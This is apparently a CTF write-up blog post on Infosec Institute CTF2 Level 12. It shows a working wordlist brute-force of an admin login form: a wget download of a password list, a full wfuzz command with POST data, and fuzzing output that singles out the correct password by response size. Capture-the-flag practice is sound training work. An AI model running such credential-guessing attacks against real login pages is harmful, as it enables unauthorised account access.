---
layout: post
title: Infosec Institute CTF2 Practical Web Hacking Level 12
category: Web
tags: infosec
---

**Vulnerability** Dictionary Attack
**Description:**

![screen]({{site.url}}/assets/Screen Shot 2015-07-17 at 7.10.58 PM.png)

## Write-up

For almost all levels I will be using Burpsuite. Burpsuite is an interception proxy that lets us modify the HTTP request
 / response by intercepting the data between the browser and the web server.
 
Let's be good boys and listen to the web page talking! Googling "filetype:lst password" takes us to
http://www.openwall.com/passwords/wordlists/password-2011.lst  
Download the password list in our local directory.

{% highlight bash  %}
/infosec2$ wget http://www.openwall.com/passwords/wordlists/password-2011.lst
--2015-07-17 19:14:21--  http://www.openwall.com/passwords/wordlists/password-2011.lst
Resolving www.openwall.com (www.openwall.com)... 195.42.179.202
Connecting to www.openwall.com (www.openwall.com)|195.42.179.202|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 26215 (26K) [text/plain]
Saving to: `password-2011.lst'

100%[==========================================================================================>] 26,215      46.7K/s   in 0.5s    

2015-07-17 19:14:23 (46.7 KB/s) - `password-2011.lst' saved [26215/26215]

/infosec2$ 
{% endhighlight %}

This time we are not going to use Burpsuite, because Burpsuite's Intruder feature is being throttled in the free edition of Burp.
Instead we are going to use a tool called wfuzz. The syntax is as follows:

{% highlight bash  %}
/infosec2$ wfuzz -c -z file,password-2011.lst -d "username=admin&password=FUZZ&logIn=Login" http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php
{% endhighlight %}

'-c' is used for color output, '-z' for payload type that's why it's follow by "file" and the name of the file "password-2011.lst"
that we just downloaded. '-d' is for POST data, we can get that either by looking at the request with Burp or the source code of the
submission form. And at the end we need to send our request to the correct URL and php page intended for the form.

Wfuzz is going to start using each of the words in our dictionary file in place of the keyword 'FUZZ' which we placed
in the POST data of the request.

{% highlight bash  %}
/infosec2# wfuzz -c -z file,password-2011.lst -d "username=admin&password=FUZZ&logIn=Login" http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php

********************************************************
* Wfuzz  2.0 - The Web Bruteforcer                     *
********************************************************

Target: http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php
Payload type: file,password-2011.lst

Total requests: 3557
==================================================================
ID	Response   Lines      Word         Chars          Request    
==================================================================

00001:  C=200    138 L	     309 W	   4880 Ch	  "en compiled by Solar Designer of Openwall Project,"
00002:  C=200    138 L	     309 W	   4880 Ch	  " - 1234567890"
00003:  C=200    138 L	     309 W	   4880 Ch	  " - #!comment:"
00004:  C=200    138 L	     309 W	   4880 Ch	  " - password"
00005:  C=200    138 L	     309 W	   4880 Ch	  " - #!comment: http://www.openwall.com/wordlists/"
00006:  C=200    138 L	     309 W	   4880 Ch	  "990's, sorted for decreasing number of occurrences"
00007:  C=200    138 L	     309 W	   4880 Ch	  " - #!comment:"
00008:  C=200    138 L	     309 W	   4880 Ch	  " - 12345678"
00009:  C=200    138 L	     309 W	   4880 Ch	  " - 123456"
00010:  C=200    138 L	     309 W	   4880 Ch	  " - abc123"
**** omitted for space ****
00282:  C=200    138 L	     309 W	   4880 Ch	  " - peace"
00283:  C=200    138 L	     309 W	   4880 Ch	  " - peanut"
00284:  C=200    138 L	     309 W	   4880 Ch	  " - phantom"
00285:  C=200    143 L	     284 W	   4731 Ch	  " - princess"
00286:  C=200    138 L	     309 W	   4880 Ch	  " - popcorn"
00287:  C=200    138 L	     309 W	   4880 Ch	  " - pumpkin"
00288:  C=200    138 L	     309 W	   4880 Ch	  " - purple"
00289:  C=200    138 L	     309 W	   4880 Ch	  " - psycho"
{% endhighlight %}

We can see that even incorrect passwords return 200OK HTTP response code, so the trick here would be to look for
returned pages with unusual character count. If you notice each of the passwords used returns a page with character count of
4880, except password "princess" which returned a page with 4731 characters, so let's try that !

![screen3]({{site.url}}/assets/Screen Shot 2015-07-17 at 7.27.34 PM.png)

## Links

* <http://ctf.infosecinstitute.com/ctf2/exercises/ex12.php>
